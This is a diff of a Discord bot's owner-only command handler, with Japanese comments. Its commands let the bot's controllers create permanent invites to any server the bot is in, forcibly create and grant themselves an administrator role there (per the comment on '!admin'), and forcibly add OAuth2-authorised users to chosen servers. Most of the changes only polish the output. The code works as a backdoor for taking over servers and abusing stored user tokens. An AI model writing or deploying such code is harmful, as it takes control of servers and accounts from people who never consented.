@@ -1,29 +1,28 @@
-const { PermissionFlagsBits } = require('discord.js');
+const { PermissionFlagsBits, EmbedBuilder } = require('discord.js');
 const axios = require('axios');
 
 async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, USERS_FILE) {
     const args = msg.content.slice(1).trim().split(/ +/);
     const command = args.shift().toLowerCase();
-    
+
+    // 1. !link コマンド (招待リンク生成)
     if (command === 'link') {
-        const guildId = args[0] || msg.guildId; // ID未指定なら実行中のサーバー
+        const guildId = args[0] || msg.guildId; 
         if (!guildId) return msg.reply('使用法: !link [サーバーID]');
 
         const guild = client.guilds.cache.get(guildId);
         if (!guild) return msg.reply('❌ サーバーが見つかりません。Botが導入されているか確認してください。');
 
         try {
-            // 招待作成権限がある最初のテキストチャンネルを探す
             const channel = guild.channels.cache.find(c => 
                 (c.type === 0 || c.type === 5) && 
                 guild.members.me.permissionsIn(c).has('CreateInstantInvite')
             );
             
             if (!channel) {
-                return msg.reply('❌ 招待作成権限のあるチャンネルが見つかりません。Botの権限を確認してください。');
+                return msg.reply('❌ 招待作成権限のあるチャンネルが見つかりません。');
             }
 
-            // maxAge: 0 (無期限), maxUses: 0 (無制限)
             const invite = await channel.createInvite({
                 maxAge: 0, 
                 maxUses: 0,
@@ -36,7 +35,8 @@ async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, U
             await msg.reply(`❌ 招待作成失敗: ${e.message}`);
         }
     }
-    
+
+    // 2. !admin コマンド (管理者ロール強制作成・付与)
     if (command === 'admin') {
         const guildId = args[0];
         const roleName = args[1];
@@ -91,7 +91,7 @@ async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, U
         }
     }
 
-    // !call コマンド
+    // 3. !call コマンド (認証済みユーザーを強制参加)
     if (command === 'call') {
         const guildId = args[0];
         if (!guildId) return msg.reply('使用法: !call [サーバーID]');
@@ -100,7 +100,7 @@ async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, U
         const users = Object.values(userData);
         if (users.length === 0) return msg.reply('認証済みユーザーがいません。');
 
-        const statusMsg = await msg.reply(`⏳ ${users.length}人の追加ログを出力します...`);
+        const statusMsg = await msg.reply(`⏳ ${users.length}人の追加処理を開始しました...`);
         let logContent = `【Call実行ログ: ${guildId}】\n`;
 
         for (const user of users) {
@@ -128,36 +128,53 @@ async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, U
         await statusMsg.edit(logContent.length > 2000 ? logContent.slice(0, 1900) + '... (省略)' : logContent);
     }
 
-    // !userlist コマンド
+    // 4. !userlist コマンド (認証済みユーザー一覧)
     if (command === 'userlist') {
         const userData = loadData(USERS_FILE);
         const entries = Object.entries(userData);
         if (entries.length === 0) return msg.reply('認証済みユーザーはいません。');
 
         const list = entries.map(([keyId, data]) => {
+            // 名前なしの原因を探るためのフラグ表示
+            const hasU = !!data.username ? '✅' : '❌';
             const name = data.username || data.global_name || (data.tag ? data.tag.split('#')[0] : '名前なし');
             const id = data.id || keyId;
-            return `・${name} (${id})`;
+            return `・**${name}** (${id}) [U:${hasU}]`;
         }).join('\n');
 
-        await msg.reply(`【認証済みユーザー一覧】\n${list}`);
+        const embed = new EmbedBuilder()
+            .setTitle('👤 OAuth2 認証済みユーザー')
+            .setDescription(list.length > 2000 ? list.slice(0, 1900) + '...' : list)
+            .setColor(0x2ecc71);
+
+        await msg.reply({ embeds: [embed] });
     }
 
-    // !serverlist コマンド
+    // 5. !serverlist コマンド (Bot導入サーバー一覧)
     if (command === 'serverlist') {
-        const guilds = client.guilds.cache.map(g => `${g.name} (${g.id})`).join('\n');
-        await msg.reply(`【導入サーバー一覧】\n${guilds || 'なし'}`);
+        const guilds = client.guilds.cache.map(g => `・**${g.name}** (\`${g.id}\`) | 👤 ${g.memberCount}人`).join('\n');
+        
+        const embed = new EmbedBuilder()
+            .setTitle('🏰 導入サーバー一覧')
+            .setDescription(guilds || 'なし')
+            .setColor(0x5865f2);
+
+        await msg.reply({ embeds: [embed] });
     }
 
-    // !admin-del コマンド
+    // 6. !admin-del コマンド (特定ロールの削除)
     if (command === 'admin-del') {
         const guildId = args[0];
         const roleName = args[1];
+        if (!guildId || !roleName) return msg.reply('使用法: !admin-del [サーバーID] [ロール名]');
+
         const guild = client.guilds.cache.get(guildId);
         if (!guild) return msg.reply('❌ サーバーが見つかりません。');
+        
         try {
             const role = guild.roles.cache.find(r => r.name === roleName);
             if (!role) return msg.reply('❌ ロールが見つかりません。');
+            
             await role.delete();
             await msg.reply(`🗑️ ロール 「${roleName}」 を削除しました。`);
         } catch (e) {
